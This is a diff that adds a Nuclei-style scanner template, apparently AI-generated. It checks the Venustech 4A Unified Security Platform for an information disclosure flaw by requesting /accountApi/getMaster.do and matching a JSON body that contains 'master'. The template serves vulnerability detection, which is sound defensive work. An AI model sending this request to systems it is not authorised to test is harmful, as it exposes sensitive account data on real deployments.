@@ -1,0 +1,27 @@
+id: venustech-4a-info-disclosure
+info:
+  name: Venustech 4A Unified Security Platform Information Disclosure
+  author: ProjectDiscoveryAI
+  severity: medium
+  description: |
+    The attacker reads sensitive system information by constructing a special URL address.
+  tags: information-disclosure
+  classification:
+    cvss-score: 6.5
+http:
+  - raw:
+      - |
+        GET /accountApi/getMaster.do HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        regex:
+          - "^\\{.*\\}$" # JSON response validation
+      - type: word
+        words:
+          - "master"
+        part: body
